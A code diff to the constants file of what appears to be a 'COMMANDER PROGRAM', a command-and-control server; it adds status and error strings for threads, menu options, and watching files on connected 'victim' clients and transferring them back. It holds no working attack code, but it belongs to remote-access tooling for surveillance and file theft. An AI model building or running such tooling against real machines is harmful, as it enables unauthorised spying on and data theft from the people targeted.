@@ -6,6 +6,10 @@ LOCAL_HOST_VALUE = "127.0.0.1"
 MIN_QUEUE_SIZE = 5
 CLIENT_LIST_INITIAL_SIZE = 1
 NEW_CONNECTION_MSG = "[+] NOTICE: There is a new client that has connected ({})"
+THREAD_START_MSG = "[+] THREAD STARTED: The following thread has started: {}"
+THREAD_STOPPING_MSG = "[+] STOP THREAD: Now stopping the following thread {}..."
+THREAD_STOPPED_MSG = "[+] THREAD STOPPED: Thread has finished execution!"
+KEYBOARD_INTERRUPT_MSG = "[+] CTRL + C PRESSED: Processing keyboard interrupt..."
 
 # MENU Constants
 OPENING_BANNER = "===================================== || COMMANDER PROGRAM || ====================================="
@@ -58,6 +62,7 @@ MIN_BUFFER_SIZE = 200
 MENU_ACTION_START_MSG = "\n[+] ACTION SELECTED: Now performing menu item {}:"
 RETURN_MAIN_MENU_MSG = "[+] Now returning to main menu..."
 DOWNLOADS_DIR = "downloads"
+INVALID_MENU_SELECTION = "[+] MENU SELECTION: Please enter a valid menu option (0 to 15)..."
 
 # GENERAL CONSTANTS
 CLIENT_LIST_EMPTY_ERROR = ("[+] ERROR: The command server is not connected to any clients! (TIP: Consider using "
@@ -151,11 +156,27 @@ ENTER_TARGET_PORT_GET_FILES = "[+] Enter the target (victim) port to receive rec
 
 # MENU ITEM 9 - Watch File
 START_WATCH_FILE_MSG = "[+] [MENU ITEM 9] - Now Watching File"
+WATCH_FILE_NO_CLIENTS_ERROR = "[+] WATCH_FILE_ERROR: The command server is not connected to any clients!"
 WATCH_FILE_SIGNAL = "WATCH FILE"
+WATCH_FILE_TRANSFER_SUCCESS_MODIFY = ("[+] FILE TRANSFER SUCCESSFUL: {} has been transferred successfully "
+                                      "[due to modification]")
+WATCH_FILE_TRANSFER_SUCCESS_DELETION = ("[+] FILE TRANSFER SUCCESSFUL: {} has been transferred successfully "
+                                        "[due to deletion]")
+WATCH_FILE_STATUS_TRUE_ERROR = ("[+] WATCH_FILE_ERROR: This specific client (IP: {}, Port: {}) "
+                                "is already watching a file!")
+WATCH_FILE_STATUS_TRUE_ERROR_SUGGEST = "[+] TIP: Stop watching a file for this specific client using menu item 11"
+NOT_WATCHING_FILE_ERROR = "[+] STOP WATCH FILE ERROR: You are not currently watching a file!"
 
+
+# MENU ITEM 11 - Stop Watching File
+STOP_WATCH_FILE_MSG = "[+] [MENU ITEM 11] - Now Stopping Watch File"
+STOP_WATCH_FILE_NO_CLIENTS_ERROR = "[+] STOP_WATCH_FILE_ERROR: The command server is not connected to any clients!"
+STOP_WATCH_FILE_TIP = ("[+] TIP: You can wait for an file event trigger from ({}, {}) to "
+                       "trigger STOP or press CTRL + C to go back to main menu")
 
 # MENU ITEM 12 - Connect to a specific victim
 INVALID_INPUT_ERROR = "[+] ERROR: Invalid format for either IP address or port number was provided : {}"
+
 
 # DESTINATION IP/PORT Constants
 NO_ARG_ERROR = "[+] NO_ARG_ERROR: No arguments were passed in!"
